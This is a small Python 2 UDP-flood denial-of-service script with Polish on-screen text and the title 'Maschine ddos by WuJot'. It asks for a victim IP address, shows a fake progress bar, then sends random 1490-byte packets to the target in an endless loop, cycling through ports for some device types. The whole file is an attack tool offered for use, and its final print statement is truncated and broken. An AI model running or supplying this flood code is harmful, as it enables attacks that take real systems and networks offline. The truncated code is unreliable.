print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Settings")
print
print "Maschine ddos by WuJot"
print "device: r = router, c = computer, o = other"
print "please, write the victim ip adress"
print
name = raw_input("Device: ")
if name == "o":
  port = input("Device port: ")
  amogus = 0
ip = raw_input("IP Target : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack mordo")
print "Leci ddos na ip:", ip
print
print "Przygotowywanie"
print ("\033[92m")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(3)
print
raw_input("ddos gotowy, kilknij Enter by rozpoczac.")
print
if name == "c":
  amogus=1
  port = 22
if name == "r":
  port = 11211
  amogus=0
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + amogus
     print "Sent %s packet to %s throught port:%s"%(sent,i>
     if port == 65534:
       port = 1
